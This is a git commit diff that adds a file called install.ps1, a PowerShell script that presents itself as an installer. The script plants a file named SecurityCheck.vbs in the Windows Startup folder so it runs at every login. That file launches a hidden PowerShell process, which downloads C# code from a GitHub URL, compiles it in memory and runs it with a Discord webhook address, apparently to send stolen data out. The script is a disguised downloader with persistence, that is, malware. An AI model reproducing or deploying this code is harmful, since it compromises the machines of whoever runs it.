345cd8602cac88ad4a3a0299c97406bc1416480d
jfheifohfai <168677903+jfheifohfai@users.noreply.github.com>
2026-04-11 20:55:11 +0200

    Create install.ps1

---
+++ install.ps1
@@ -0,0 +1,12 @@
+$webhook = "https://discord.com/api/webhooks/1491728198092849215/DkCsPFapma_HMcUuG5GBIt6B9f55h99touvLjLOxvyLijuaTuZT15NO-xzYrJ78S2d2o"
+$github = "https://raw.githubusercontent.com/jfheifohfai/diwidwidid/refs/heads/main/bot.cs"
+$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SecurityCheck.vbs"
+
+$vbsCode = @"
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "powershell -WindowStyle Hidden -Command `$w='''$webhook'''; `$g='''$github'''; `$c=(iwr -UseBasicParsing `$g).Content; Add-Type -TypeDefinition `$c -ReferencedAssemblies '''System.Management''','''System.Net.Http''','''System.Drawing''','''System.Windows.Forms''','''System.IO'''; [Program]::Main(`$w)", 0, False
+"@
+
+[System.IO.File]::WriteAllText($startupPath, $vbsCode)
+
+wscript.exe $startupPath
